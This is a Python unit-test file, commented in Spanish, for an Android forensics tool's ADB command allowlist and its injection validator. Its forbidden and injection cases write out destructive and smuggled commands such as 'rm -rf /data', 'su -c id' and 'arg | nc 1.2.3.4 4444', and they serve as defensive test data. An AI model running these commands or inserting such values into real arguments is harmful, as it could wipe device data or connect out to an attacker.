"""Pruebas unitarias para la lista blanca de comandos ADB y prevención de inyección."""

from __future__ import annotations

import pytest

from jullforensics.adb.allowlist import (
    CommandArgumentInjectionError,
    CommandClass,
    classify_command,
    validate_argument_safety,
)


def test_classify_host_commands() -> None:
    assert classify_command(["version"]) == CommandClass.HOST
    assert classify_command(["devices"]) == CommandClass.HOST
    assert classify_command(["track-devices", "-l"]) == CommandClass.HOST
    assert classify_command(["start-server"]) == CommandClass.HOST


def test_classify_read_commands() -> None:
    assert classify_command(["shell", "getprop", "ro.product.model"]) == CommandClass.READ
    assert classify_command(["shell", "dumpsys", "battery"]) == CommandClass.READ
    assert classify_command(["shell", "pm", "list", "packages", "-3"]) == CommandClass.READ
    assert classify_command(["pull", "-a", "/sdcard/file.txt", "local/"]) == CommandClass.READ
    assert classify_command(["exec-out", "screencap", "-p"]) == CommandClass.READ
    assert (
        classify_command(["exec-out", "tar", "-cf", "-", "-C", "/storage/emulated/0", "."])
        == CommandClass.READ
    )
    assert classify_command(["exec-out", "find", "/sdcard", "-type", "f"]) == CommandClass.READ
    assert classify_command(["exec-out", "cat", "/sdcard/file.txt"]) == CommandClass.READ
    assert classify_command(["logcat", "-d"]) == CommandClass.READ
    assert (
        classify_command(["shell", "content", "query", "--uri", "content://contacts/phones"])
        == CommandClass.READ
    )
    assert classify_command(["shell", "pm", "path", "com.android.chrome"]) == CommandClass.READ
    assert classify_command(["shell", "wm", "size"]) == CommandClass.READ


def test_classify_read_heavy_commands() -> None:
    assert classify_command(["bugreportz"]) == CommandClass.READ_HEAVY
    assert classify_command(["backup", "-apk", "-all"]) == CommandClass.READ_HEAVY


def test_classify_intrusive_commands() -> None:
    assert (
        classify_command(["shell", "settings", "put", "global", "stay_on_while_plugged_in", "3"])
        == CommandClass.INTRUSIVE
    )
    assert (
        classify_command(["shell", "input", "swipe", "100", "500", "100", "100"])
        == CommandClass.INTRUSIVE
    )


def test_classify_forbidden_commands() -> None:
    assert classify_command(["root"]) == CommandClass.FORBIDDEN
    assert classify_command(["reboot"]) == CommandClass.FORBIDDEN
    assert classify_command(["install", "malware.apk"]) == CommandClass.FORBIDDEN
    assert classify_command(["uninstall", "com.whatsapp"]) == CommandClass.FORBIDDEN
    assert classify_command(["shell", "rm", "-rf", "/data"]) == CommandClass.FORBIDDEN
    assert classify_command(["shell", "screencap", "/sdcard/test.png"]) == CommandClass.FORBIDDEN
    assert classify_command(["exec-out", "tar", "-xvf", "archive.tar"]) == CommandClass.FORBIDDEN
    assert classify_command(["shell", "su", "-c", "id"]) == CommandClass.FORBIDDEN
    assert classify_command([]) == CommandClass.FORBIDDEN


def test_prevent_metacharacter_injection() -> None:
    with pytest.raises(CommandArgumentInjectionError):
        validate_argument_safety("file.txt; rm -rf /")

    with pytest.raises(CommandArgumentInjectionError):
        validate_argument_safety("arg1 && id")

    with pytest.raises(CommandArgumentInjectionError):
        validate_argument_safety("arg | nc 1.2.3.4 4444")

    with pytest.raises(CommandArgumentInjectionError):
        validate_argument_safety("`reboot`")

    with pytest.raises(CommandArgumentInjectionError):
        validate_argument_safety("param\nreboot")

    with pytest.raises(CommandArgumentInjectionError):
        classify_command(["shell", "getprop; rm -rf /"])
